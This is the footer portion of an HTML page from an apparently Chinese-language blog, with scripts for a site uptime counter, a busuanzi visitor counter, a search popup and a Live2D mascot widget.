  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>